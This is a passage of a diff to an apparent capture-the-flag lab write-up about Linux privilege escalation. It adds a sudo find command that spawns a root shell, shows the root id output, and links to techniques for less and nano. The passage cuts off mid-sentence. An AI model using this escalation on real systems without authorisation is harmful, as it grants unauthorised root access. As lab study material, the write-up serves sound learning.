@@ -366,3 +366,10 @@ User karen may run the following commands on ip-10-10-79-2:
 
 `sudo -l` reveals that karen can run `find`, `less` and `nano` as root. After searching how to use find command to gain root access on [gtfobins](https://gtfobins.github.io/gtfobins/find/#sudo), below command can give access to root shell.
 
+```
+$ sudo find . -exec /bin/sh \; -quit
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Similarly `less` can be exploited as explained [here](https://gtfobins.github.io/gtfobins/less/#sudo) and `nano` can be exploited as explainte
